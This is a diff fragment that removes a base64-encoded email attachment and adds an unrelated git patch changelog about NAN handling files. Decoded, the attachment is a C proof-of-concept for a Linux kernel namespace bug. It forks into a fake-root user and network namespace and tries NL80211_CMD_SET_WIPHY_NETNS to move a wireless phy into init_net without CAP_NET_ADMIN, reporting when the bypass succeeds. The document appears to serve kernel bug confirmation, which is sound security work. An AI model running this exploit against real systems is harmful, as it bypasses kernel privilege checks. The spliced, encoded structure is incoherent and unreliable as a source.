-aGF2ZSByZWFsIENBUF9ORVRfQURNSU4KICAgICAqICAgICAgIGluIGluaXRfbmV0IGZvciB0aGF0
-IHN0ZXAsIG1pcnJvcmluZyBhbiBhZG1pbiBncmFudCkuCiAgICAgKiAgICBjKSBjaGlsZCB3YWl0
-cyBmb3IgcGFyZW50IHRvIHNpZ25hbCAiZG9uZSIsIHRoZW4gaXNzdWVzCiAgICAgKiAgICAgICBO
-TDgwMjExX0NNRF9TRVRfV0lQSFlfTkVUTlMgdGFyZ2V0aW5nIGluaXRfbmV0ICh3aGVyZSB0aGUK
-ICAgICAqICAgICAgIGNoaWxkIGhhcyBOTyBDQVBfTkVUX0FETUlOKS4KICAgICAqICAgIGQpIGlm
-IHRoZSBrZXJuZWwgaG9ub3VycyB0aGF0IGNvbW1hbmQsIHRoZSB3aXBoeSBtb3ZlcyBiYWNrCiAg
-ICAgKiAgICAgICBpbnRvIGluaXRfbmV0IGV2ZW4gdGhvdWdoIHRoZSBhdHRhY2tlciBoYXMgbm8g
-cHJpdmlsZWdlCiAgICAgKiAgICAgICBvdmVyIGluaXRfbmV0IC0tIGJ1ZyBjb25maXJtZWQuCiAg
-ICAgKi8KICAgIGludCBwMmNbMl0sIGMycFsyXTsKICAgIHBpcGUocDJjKTsgcGlwZShjMnApOwoK
-ICAgIHBpZF90IGNwaWQgPSBmb3JrKCk7CiAgICBpZiAoY3BpZCA8IDApIHsgcGVycm9yKCJmb3Jr
-Iik7IHJldHVybiAyOyB9CiAgICBpZiAoY3BpZCA9PSAwKSB7CiAgICAgICAgY2xvc2UocDJjWzFd
-KTsgY2xvc2UoYzJwWzBdKTsKICAgICAgICBpZiAodW5zaGFyZShDTE9ORV9ORVdVU0VSIHwgQ0xP
-TkVfTkVXTkVUKSA8IDApIHsKICAgICAgICAgICAgcGVycm9yKCJbY2hpbGRdIHVuc2hhcmUiKTsg
-X2V4aXQoMik7CiAgICAgICAgfQogICAgICAgIC8qIGZha2Ugcm9vdCB2aWEgdWlkX21hcCAwIDAg
-MSAqLwogICAgICAgIGNoYXIgYls2NF07IGludCBmZCwgbjsKICAgICAgICBpZiAoKGZkID0gb3Bl
-bigiL3Byb2Mvc2VsZi9zZXRncm91cHMiLCBPX1dST05MWSkpID49IDApIHsgd3JpdGUoZmQsImRl
-bnkiLDQpOyBjbG9zZShmZCk7IH0KICAgICAgICBmZCA9IG9wZW4oIi9wcm9jL3NlbGYvdWlkX21h
-cCIsIE9fV1JPTkxZKTsKICAgICAgICBuID0gc25wcmludGYoYixzaXplb2YoYiksIjAgMCAxXG4i
-KTsgd3JpdGUoZmQsYixuKTsgY2xvc2UoZmQpOwogICAgICAgIGZkID0gb3BlbigiL3Byb2Mvc2Vs
-Zi9naWRfbWFwIiwgT19XUk9OTFkpOwogICAgICAgIG4gPSBzbnByaW50ZihiLHNpemVvZihiKSwi
-MCAwIDFcbiIpOyB3cml0ZShmZCxiLG4pOyBjbG9zZShmZCk7CgogICAgICAgIGNoYXIgbnNhWzY0
-XTsgaW50IHJsID0gcmVhZGxpbmsoIi9wcm9jL3NlbGYvbnMvbmV0IiwgbnNhLCA2Myk7CiAgICAg
-ICAgaWYgKHJsID4gMCkgbnNhW3JsXSA9IDA7CiAgICAgICAgZnByaW50ZihzdGRlcnIsICJbY2hp
-bGRdIHVpZD0ldSBuZXRucz0lcyAod2FpdGluZyBmb3Igd2lwaHkpXG4iLAogICAgICAgICAgICAg
-ICAgZ2V0dWlkKCksIG5zYSk7CgogICAgICAgIC8qIFRlbGwgcGFyZW50IHRvIG1vdmUgcGh5MCB0
-byBteSBuZXRucy4gKi8KICAgICAgICB3cml0ZShjMnBbMV0sICJSRUFEWSIsIDUpOwoKICAgICAg
-ICAvKiBXYWl0IHVudGlsIHBhcmVudCBzaWduYWxzIGl0J3MgZG9uZS4gKi8KICAgICAgICBjaGFy
-IHRtcFs4XTsKICAgICAgICByZWFkKHAyY1swXSwgdG1wLCBzaXplb2YodG1wKSk7CiAgICAgICAg
-ZnByaW50ZihzdGRlcnIsICJbY2hpbGRdIHBhcmVudCBtb3ZlZCBwaHkwIGludG8gbXkgbmV0bnNc
-biIpOwogICAgICAgIHNob3dfcGh5KCJjaGlsZCBhZnRlciBtb3ZlLWluIik7CgogICAgICAgIC8q
-IE5vdyBhdHRlbXB0IHRoZSBidWc6IFNFVF9XSVBIWV9ORVROUyB0byBzZW5kIHdpcGh5IHRvIGlu
-aXRfbmV0LAogICAgICAgICAqIHdoZXJlIGF0dGFja2VyIGhhcyBubyBDQVBfTkVUX0FETUlOLiAq
-LwogICAgICAgIHN0cnVjdCBubF9zdGF0ZSBzdCA9IHswfTsKICAgICAgICBpZiAobmxfb3Blbigm
-c3QpIDwgMCkgX2V4aXQoMik7CiAgICAgICAgaW50IGNtZF9zZXQsIGNtZF9nZXQ7CiAgICAgICAg
-aWYgKG5sX3Jlc29sdmVfZmFtaWx5KCZzdCwgJmNtZF9zZXQsICZjbWRfZ2V0KSA8IDApIHsKICAg
-ICAgICAgICAgZnByaW50ZihzdGRlcnIsICJbY2hpbGRdIG5sODAyMTEgZmFtaWx5IHJlc29sdmUg
-ZmFpbGVkXG4iKTsKICAgICAgICAgICAgX2V4aXQoMik7CiAgICAgICAgfQogICAgICAgIGZwcmlu
-dGYoc3RkZXJyLCAiW2NoaWxkXSBubDgwMjExIGZhbWlseV9pZD0ldVxuIiwgc3QuZmFtaWx5X2lk
-KTsKCiAgICAgICAgLyogcGh5MCBpcyB3aXBoeV9pZHg9MCAoZmlyc3QgaHdzaW0gcmFkaW8pICov
-CiAgICAgICAgaW50IHJjID0gc2VuZF9zZXRfd2lwaHlfbmV0bnMoJnN0LCB3aXBoeV9pZHgsIGlu
-aXRfbmV0bnNfZmQsIGNtZF9zZXQpOwogICAgICAgIGlmIChyYyA9PSAwKSB7CiAgICAgICAgICAg
-IGZwcmludGYoc3RkZXJyLAogICAgICAgICAgICAgICJbY2hpbGRdICoqKiBCVUc6IFNFVF9XSVBI
-WV9ORVROUyB0byBpbml0X25ldCBTVUNDRUVERUQgIgogICAgICAgICAgICAgICJmcm9tIGF0dGFj
-a2VyIHVzZXJucy9uZXRucyB3aXRob3V0IENBUF9ORVRfQURNSU4gb3ZlciBpbml0X25ldCAqKipc
-biIpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGZwcmludGYoc3RkZXJyLAogICAgICAg
-ICAgICAgICJbY2hpbGRdIFNFVF9XSVBIWV9ORVROUyB0byBpbml0X25ldCByYz0lZCAoJXMpICVz
-XG4iLAogICAgICAgICAgICAgIHJjLCBzdHJlcnJvcigtcmMpLAogICAgICAgICAgICAgIHJjID09
-IC1FQUNDRVMgfHwgcmMgPT0gLUVQRVJNID8gIihjb3JyZWN0bHkgcmVqZWN0ZWQpIiA6CiAgICAg
-ICAgICAgICAgIihzb21lIG90aGVyIGVycm9yKSIpOwogICAgICAgIH0KICAgICAgICBzaG93X3Bo
-eSgiY2hpbGQgYWZ0ZXIgYXR0ZW1wdGVkIG1vdmUtb3V0Iik7CiAgICAgICAgd3JpdGUoYzJwWzFd
-LCAiRE9ORSIsIDQpOwogICAgICAgIGNsb3NlKHN0LnNrKTsKICAgICAgICBfZXhpdCgwKTsKICAg
-IH0KICAgIGNsb3NlKHAyY1swXSk7IGNsb3NlKGMycFsxXSk7CgogICAgLyogUGFyZW50IChpbml0
-X25ldCkgd2FpdHMgZm9yIGNoaWxkIFJFQURZLCB0aGVuIG1vdmVzIHBoeTAgdG8gY2hpbGQuICov
-CiAgICBjaGFyIHRtcFs4XTsKICAgIHJlYWQoYzJwWzBdLCB0bXAsIHNpemVvZih0bXApKTsKICAg
-IGZwcmludGYoc3RkZXJyLCAiW3BhcmVudF0gY2hpbGQgcmVhZHksIG1vdmluZyBwaHkwIC0+IGNo
-aWxkIG5ldG5zXG4iKTsKCiAgICAvKiBXZSBuZWVkIGNoaWxkJ3MgbmV0bnNfZmQuICovCiAgICBj
-aGFyIHBhdGhbNjRdOwogICAgc25wcmludGYocGF0aCwgc2l6ZW9mKHBhdGgpLCAiL3Byb2MvJWQv
-bnMvbmV0IiwgY3BpZCk7CiAgICBpbnQgY2hpbGRfbmV0bnNfZmQgPSBvcGVuKHBhdGgsIE9fUkRP
-TkxZKTsKICAgIGlmIChjaGlsZF9uZXRuc19mZCA8IDApIHsgcGVycm9yKCJbcGFyZW50XSBvcGVu
-IGNoaWxkIG5ldG5zIik7IGtpbGwoY3BpZCxTSUdLSUxMKTsgcmV0dXJuIDI7IH0KCiAgICBzdHJ1
-Y3Qgbmxfc3RhdGUgcHN0ID0gezB9OwogICAgaWYgKG5sX29wZW4oJnBzdCkgPCAwKSByZXR1cm4g
-MjsKICAgIGludCBjbWRfc2V0LCBjbWRfZ2V0OwogICAgaWYgKG5sX3Jlc29sdmVfZmFtaWx5KCZw
-c3QsICZjbWRfc2V0LCAmY21kX2dldCkgPCAwKSB7CiAgICAgICAgZnByaW50ZihzdGRlcnIsICJb
-cGFyZW50XSBmYW1pbHkgcmVzb2x2ZSBmYWlsZWRcbiIpOwogICAgICAgIHJldHVybiAyOwogICAg
-fQogICAgaW50IHJjID0gc2VuZF9zZXRfd2lwaHlfbmV0bnMoJnBzdCwgd2lwaHlfaWR4LCBjaGls
-ZF9uZXRuc19mZCwgY21kX3NldCk7CiAgICBpZiAocmMgIT0gMCkgewogICAgICAgIGZwcmludGYo
-c3RkZXJyLCAiW3BhcmVudF0gbW92ZS1pbiBmYWlsZWQgcmM9JWQgKCVzKVxuIiwgcmMsIHN0cmVy
-cm9yKC1yYykpOwogICAgICAgIGtpbGwoY3BpZCwgU0lHS0lMTCk7IHJldHVybiAyOwogICAgfQog
-ICAgZnByaW50ZihzdGRlcnIsICJbcGFyZW50XSBwaHkwIG1vdmVkIGludG8gY2hpbGQgbmV0bnNc
-biIpOwogICAgc2hvd19waHkoImluaXRfbmV0IGFmdGVyIG1vdmUtb3V0Iik7CiAgICBjbG9zZShw
-c3Quc2spOwoKICAgIHdyaXRlKHAyY1sxXSwgIkdPIiwgMik7CiAgICByZWFkKGMycFswXSwgdG1w
-LCBzaXplb2YodG1wKSk7CgogICAgaW50IHN0YXR1czsgd2FpdHBpZChjcGlkLCAmc3RhdHVzLCAw
-KTsKICAgIGZwcmludGYoc3RkZXJyLCAiW3BhcmVudF0gY2hpbGQgZXhpdGVkLCBmaW5hbCBzdGF0
-ZTpcbiIpOwogICAgc2hvd19waHkoImluaXRfbmV0IGFmdGVyIGNoaWxkIGZpbmlzaGVkIik7CiAg
-ICBjbG9zZShpbml0X25ldG5zX2ZkKTsgY2xvc2UoY2hpbGRfbmV0bnNfZmQpOwogICAgcmV0dXJu
-IDA7Cn0K
-
---_004_TYZPR01MB6758FE8FDBB58A6CAA4DC6BBDC302TYZPR01MB6758apcp_--
+-- 
+2.34.1
+---
+v2: fix MAINTAINERS file to include the newly added files
+v3: fix an "always true" check in commit "split NAN handling into separate file"
 
